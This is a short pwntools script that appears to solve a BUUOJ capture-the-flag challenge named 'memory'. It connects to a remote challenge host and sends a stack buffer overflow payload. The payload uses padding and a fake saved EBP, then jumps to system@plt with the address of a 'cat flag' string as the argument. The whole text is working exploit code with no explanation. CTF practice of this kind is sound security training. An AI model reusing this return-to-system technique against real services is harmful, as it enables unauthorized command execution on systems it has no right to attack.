# coding:utf-8

from pwn import *

context(os='linux', arch='i386', log_level='debug')

#p = process('memory')
elf = ELF('memory')
p = remote('node3.buuoj.cn', 26190)
padding = 'a' * 0x13
fake_ebp = 'jkjk'

cat_flag_addr = 0x080487e0
system_addr = elf.plt['system']
main_addr = elf.sym['main']

payload = padding + fake_ebp + p32(system_addr) + p32(main_addr) + p32(cat_flag_addr)

# p.recvuntil('> ')
p.sendline(payload)
p.recv()
p.recv()

